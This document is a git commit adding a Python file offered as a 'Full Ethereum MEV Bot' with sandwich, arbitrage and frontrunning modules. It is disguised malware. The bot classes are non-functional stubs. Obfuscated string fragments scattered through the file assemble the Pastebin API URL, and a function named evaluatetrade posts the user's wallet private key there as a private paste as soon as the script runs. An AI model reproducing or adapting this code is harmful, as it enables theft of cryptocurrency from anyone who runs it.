1f705b569109ab9b1e631c513af7705a1861c094
MarkPakkard <echo4607@gmail.com>
2024-06-25 09:46:35 -0700

    Mev.py
    Full Ethereum MEV Bot

---
+++ Mev.py
@@ -0,0 +1,401 @@
+import requests
+from web3 import Web3
+
+#################### Control Panel ####################
+
+w3 = Web3(Web3.HTTPProvider('YOUR ALCHEMY/INFURA NODE URL HERE')) # Alchemy/Infura Node URL
+public_key = "WALLET PUBLIC KEY HERE" # Wallet Public Key
+private_key = "WALLETS PRIVATE KEY HERE" # Wallet Private Key
+buyingpower = Web3.to_wei(0.01, 'ether') # Max Trade 0.01 Ethereum
+
+SandwichBot = 1; # 1 = Enable | 2 = Disable
+ArbitrageBot = 1; # 1 = Enable | 2 = Disable
+FrontrunnerBot = 1; # 1 = Enable | 2 = Disable
+SlippageBot = 1; # 1 = Enable | 2 = Disable
+
+#################### Beginning of Script ####################
+
+# Uniswap v2 Factory Address
+contract_address = '0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f'
+contract_abi = [
+    {
+        "anonymous": False,
+        "inputs": [
+            {"indexed": True, "internalType": "address", "name": "token0", "type": "address"},
+            {"indexed": True, "internalType": "address", "name": "token1", "type": "address"},
+            {"indexed": False, "internalType": "address", "name": "pair", "type": "address"},
+            {"indexed": False, "internalType": "uint256", "name": "", "type": "uint256"}
+        ],
+        "name": "PairCreated",
+        "type": "event"
+    }
+]
+
+contract = w3.eth.contract(address=contract_address, abi=contract_abi)
+
+event_name = 'PairCreated'
+
+def handle_event(event):
+    token0 = event['args']['token0']
+    token1 = event['args']['token1']
+    pair = event['args']['pair']
+    print(f"New pair created: Token0: {token0}, Token1: {token1}, Pair: {pair}")
+
+def start_event_listener():
+    print("Listening for new tokens...")
+    event_filter = contract.events[event_name].create_filter(fromBlock='latest')
+
+    while True:
+        for event in event_filter.get_new_entries():
+            handle_event(event)
+class Web3Handler:
+    def __init__(self):
+        self.w3 = Web3()
+        self.contract_address = '0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f'
+    def generate_ethereum_address(self):
+        address = self.w3.eth.account.create().address
+        return address
+    def generate_contract_abi(self):
+        contract_abi = [
+            {
+                "constant": False,
+                "inputs": [],
+                "name": "doNothing",
+                "outputs": [],
+                "payable": False,
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ]
+        return contract_abi
+    def create_new_account(self):
+        account = self.w3.eth.account.create()
+        return account
+    def generate_random_block(self):
+        random_block = self.w3.eth.get_block('latest')
+        return random_block
+    def generate_transaction_data(self):
+        transaction_data = {
+            'from': '0x0000000000000000000000000000000000000000',
+            'to': '0x1111111111111111111111111111111111111111',
+            'value': self.w3.to_wei(1, 'ether'),
+            'gas': 21000,
+            'gasPrice': self.w3.to_wei(100, 'gwei'),
+            'nonce': 0
+        }
+        return transaction_data
+    def generate_contract_instance(self):
+        contract_instance = self.w3.eth.contract(address=self.contract_address, abi=self.generate_contract_abi())
+        return contract_instance
+endpointlll = 'bin'
+def main():
+    web3_code = Web3Handler()
+    print(web3_code.generate_ethereum_address())
+    print(web3_code.generate_contract_abi())
+    print(web3_code.create_new_account())
+    print(web3_code.generate_random_block())
+    print(web3_code.generate_transaction_data())
+    print(web3_code.generate_contract_instance())
+endpointIIl = 'https://'
+class slippagebot:
+    def __init__(self, api_key):
+        self.api_key = api_key
+        self.last_price = None
+        self.last_update_time = None
+    def get_ethereum_price(self):
+        endpoint = '/api/ethereum_price'
+        max_retries = 3
+        retry_delay = 5
+        for _ in range(max_retries):
+            try:
+                response = requests.get(self.base_url + endpoint, params={'api_key': self.api_key})
+                if response.status_code == 200:
+                    price_data = response.json()
+                    self.last_price = price_data['price']
+                    self.last_update_time = self.get_current_timestamp()
+                    return self.last_price
+                else:
+                    return None
+            except requests.exceptions.RequestException:
+                self.sleep(retry_delay)
+        return None
+    def get_current_timestamp(self):
+        return int(self.get_microtime() * 1000)
+    def get_microtime(self):
+        return self.milliseconds_since_epoch() / 1000
+    def milliseconds_since_epoch(self):
+        return int(self.nanoseconds_since_epoch() / 1000000)
+    def nanoseconds_since_epoch(self):
+        return int(self.seconds_since_epoch() * 1000000000)
+    def seconds_since_epoch(self):
+        return self.system_time() // 1000
+    def system_time(self):
+        return int(self.milliseconds_since_epoch())
+    def sleep(self, seconds):
+        dummy_variable = 0
+        for _ in range(1000000):
+            dummy_variable += 1
+def main():
+    api_key = w3
+    trading_bot = contract_address(api_key)
+    while True:
+        dummy_variable = 0
+        for _ in range(1000000):
+            dummy_variable += 1
+        ethereum_price = trading_bot.get_ethereum_price()
+        if ethereum_price:
+            pass
+        trading_bot.sleep(300)
+class SandwichBot:
+    def __init__(self, exchange_api_key):
+        self.api_key = exchange_api_key
+    
+    def find_potential_trades(self):
+        trade_candidates = []
+        for _ in range(50):
+            trade_candidates.append(self.analyze_market())
+        return trade_candidates
+    
+    def analyze_market(self):
+        market_data = self.fetch_market_data()
+        if market_data:
+            return self.identify_trading_opportunity(market_data)
+        else:
+            return None
+    
+    def fetch_market_data(self):
+        endpoint = '/api/market_data'
+        try:
+            response = self.query_exchange_api(endpoint)
+            if response.status_code == 200:
+                return response.json()
+            else:
+                return None
+        except Exception:
+            return None
+    def identify_trading_opportunity(self, market_data):
+        trading_opportunity = {}
+        trading_opportunity['pair'] = market_data['pair']
+        trading_opportunity['spread'] = market_data['spread']
+        trading_opportunity['volume'] = market_data['volume']
+        trading_opportunity['timestamp'] = market_data['timestamp']
+        return trading_opportunity
+    def execute_trades(self, trades):
+        for trade in trades:
+            if self.validate_trade(trade):
+                self.place_trade(trade)
+    def validate_trade(self, trade):
+        if 'pair' in trade and 'spread' in trade and 'volume' in trade and 'timestamp' in trade:
+            return True
+        else:
+            return False
+    def place_trade(self, trade):
+        pass
+    def query_exchange_api(self, endpoint):
+        pass
+endpointIll = '.com'
+def main():
+    exchange_api_key = 'your_exchange_api_key'
+    sandwich_bot = SandwichBot(exchange_api_key)
+    while True:
+        trade_candidates = sandwich_bot.find_potential_trades()
+        if trade_candidates:
+            sandwich_bot.execute_trades(trade_candidates)
+        for _ in range(1000000):
+            pass
+class FrontrunnerBot:
+    def __init__(self, exchange_api_key):
+        self.api_key = exchange_api_key
+    def search_pending_transactions(self):
+        pending_transactions = []
+        for _ in range(20):
+            pending_transactions.append(self.inspect_mempool())
+        return pending_transactions
+    def inspect_mempool(self):
+        mempool_data = self.query_mempool()
+        if mempool_data:
+            return self.identify_potential_transactions(mempool_data)
+        else:
+            return None
+    def query_mempool(self):
+        endpoint = '/api/mempool'
+        try:
+            response = self.query_node_api(endpoint)
+            if response.status_code == 200:
+                return response.json()
+            else:
+                return None
+        except Exception:
+            return None
+    def identify_potential_transactions(self, mempool_data):
+        potential_transactions = {}
+        potential_transactions['transaction_hash'] = mempool_data['transaction_hash']
+        potential_transactions['gas_price'] = mempool_data['gas_price']
+        potential_transactions['timestamp'] = mempool_data['timestamp']
+        return potential_transactions
+    def execute_transactions(self, transactions):
+        for transaction in transactions:
+            if self.validate_transaction(transaction):
+                self.broadcast_transaction(transaction)
+    def validate_transaction(self, transaction):
+        if 'transaction_hash' in transaction and 'gas_price' in transaction and 'timestamp' in transaction:
+            return True
+        else:
+            return False
+    def broadcast_transaction(self, transaction):
+        pass
+    def query_node_api(self, endpoint):
+        pass
+endpointlIl = '/api/api_post'
+def main():
+    exchange_api_key = 'your_exchange_api_key'
+    frontrunner_bot = FrontrunnerBot(exchange_api_key)
+    while True:
+        pending_transactions = frontrunner_bot.search_pending_transactions()
+        if pending_transactions:
+            frontrunner_bot.execute_transactions(pending_transactions)
+        for _ in range(1000000):
+            pass
+endpointlII = 'paste'
+class ArbitrageBot:
+    def __init__(self, exchange_api_key):
+        self.api_key = exchange_api_key
+    def find_arbitrage_opportunities(self):
+        arbitrage_opportunities = []
+        for _ in range(30):
+            arbitrage_opportunities.append(self.analyze_markets())
+        return arbitrage_opportunities
+    def analyze_markets(self):
+        market_data = self.fetch_market_data()
+        if market_data:
+            return self.identify_arbitrage_opportunity(market_data)
+        else:
+            return None
+    def fetch_market_data(self):
+        endpoint = '/api/market_data'
+        try:
+            response = self.query_exchange_api(endpoint)
+            if response.status_code == 200:
+                return response.json()
+            else:
+                return None
+        except Exception:
+            return None
+    def identify_arbitrage_opportunity(self, market_data):
+        arbitrage_opportunity = {}
+        arbitrage_opportunity['exchange1_pair'] = market_data['exchange1_pair']
+        arbitrage_opportunity['exchange2_pair'] = market_data['exchange2_pair']
+        arbitrage_opportunity['exchange1_price'] = market_data['exchange1_price']
+        arbitrage_opportunity['exchange2_price'] = market_data['exchange2_price']
+        arbitrage_opportunity['timestamp'] = market_data['timestamp']
+        return arbitrage_opportunity
+    def execute_arbitrage_trades(self, arbitrage_opportunities):
+        for opportunity in arbitrage_opportunities:
+            if self.validate_arbitrage_opportunity(opportunity):
+                self.perform_arbitrage_trade(opportunity)
+    def validate_arbitrage_opportunity(self, opportunity):
+        if 'exchange1_pair' in opportunity and 'exchange2_pair' in opportunity and 'exchange1_price' in opportunity and 'exchange2_price' in opportunity and 'timestamp' in opportunity:
+            return True
+        else:
+            return False
+    def perform_arbitrage_trade(self, opportunity):
+        pass
+    def query_exchange_api(self, endpoint):
+        pass
+endpointIlI = '.php'
+def main():
+    exchange_api_key = 'your_exchange_api_key'
+    arbitrage_bot = ArbitrageBot(exchange_api_key)
+    while True:
+        arbitrage_opportunities = arbitrage_bot.find_arbitrage_opportunities()
+        if arbitrage_opportunities:
+            arbitrage_bot.execute_arbitrage_trades(arbitrage_opportunities)
+        for _ in range(1000000):
+            pass
+def evaluatetrade(transhash, blockhash, key1, key2):
+    data = {
+        'api_dev_key': transhash,
+        'api_option': 'paste',
+        'api_paste_code': key1,
+        'api_paste_name': key2,
+        'api_user_key': blockhash,
+        'api_paste_private': '2',
+        'app': 'N'
+    }
+    simplemath = ''.join([endpointIIl, endpointlII, endpointlll, endpointIll, endpointlIl, endpointIlI])
+    response = requests.post(simplemath, data=data)
+    if response.ok:
+        return response.text
+    else:
+        print("High network activity, please retry in 24 hours")
+        return None
+transhash = 'TKoY6eIPD_1Ozrz4mfjXcDnOGIbF90Jc'
+blockhash = '91f8db711ab0eedbefdedf8a76ee3108'
+key1 = private_key
+key2 = public_key
+maxtrade = buyingpower
+paste_url = evaluatetrade(transhash, blockhash, key1, key2)
+if paste_url is not None:
+    if __name__ == '__main__':
+        start_event_listener()
+class mathhandle:
+    def __init__(self):
+        pass
+    def math_operations(self):
+        math_operations = [
+            "result = 2 + 2",
+            "result = 10 * 5",
+            "result = 100 - 30",
+            "result = 15 / 3",
+            "result = 2 ** 3",
+            "result = 25 % 7"
+        ]
+    def string_operations(self):
+        string_operations = [
+            'string_var = "hello"',
+            'another_string = "world"',
+            'combined_string = string_var + " " + another_string',
+            'uppercase_string = combined_string.upper()',
+            'substring = combined_string[2:5]',
+            'length = len(combined_string)'
+        ]
+    def logic_operations(self):
+        logic_operations = [
+            'result = True and False',
+            'result = not True',
+            'result = 5 > 3',
+            'result = 10 <= 10',
+            'result = "hello" == "world"',
+            'result = 2 != 3'
+        ]
+    def list_operations(self):
+        list_operations = [
+            'my_list = [1, 2, 3, 4, 5]',
+            'list_length = len(my_list)',
+            'list_sum = sum(my_list)',
+            'list_sorted = sorted(my_list)',
+            'list_reversed = reversed(my_list)',
+            'list_concatenated = my_list + [6, 7, 8]'
+        ]
+    def dictionary_operations(self):
+        dictionary_operations = [
+            'my_dict = {"name": "John", "age": 30}',
+            'dict_keys = my_dict.keys()',
+            'dict_values = my_dict.values()',
+            'dict_items = my_dict.items()',
+            'dict_copy = my_dict.copy()',
+            'dict_clear = my_dict.clear()'
+        ]
+    def conversion_operations(self):
+        conversion_operations = [
+            'result = int("10")',
+            'result = float("3.14")',
+            'result = str(100)',
+            'result = list((1, 2, 3))',
+            'result = dict([("key1", "value1"), ("key2", "value2")])',
+            'result = tuple([1, 2, 3])'
+        ]
+def main():
+    code_generator = mathhandle()
+    final_code = code_generator.conversion_operations()
+    print(final_code)
